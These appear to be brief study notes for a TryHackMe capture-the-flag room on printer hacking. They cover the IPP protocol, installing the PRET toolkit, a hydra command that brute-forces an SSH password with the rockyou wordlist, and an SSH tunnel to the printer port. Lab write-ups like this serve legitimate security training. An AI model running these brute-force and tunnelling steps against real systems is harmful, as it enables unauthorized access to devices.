# Room
https://tryhackme.com/room/printerhacking101

# Task 1 - Intro
Intro

# Task 2 - IPP Port
IPP - Internet Printing Protocol - a specialized Internet protocol for communication between clients and printers.  Clients can send print jobs, query status, and cancel print jobs.  IPP runs on TCP port 631

* Resources
  * https://www.variot.eu/

# Task 3 - Exploitation
* Resources
  * https://github.com/RUB-NDS/PRET

* Installation
  * git clone https://github.com/RUB-NDS/PRET
  * cd PRET
  * python3 pret.py

* Brute-force SSH password
  * hydra -l printer -P /usr/share/wordlists/rockyou.txt  10.10.244.53 ssh -V
* Setup an SSH Tunnel
  * ssh printer@MACHINE_IP -T -L 3631:localhost:631
* Load local printer service and map it to the remote printer at localhost:3631

# Task 4 - Conclusion
Conclusion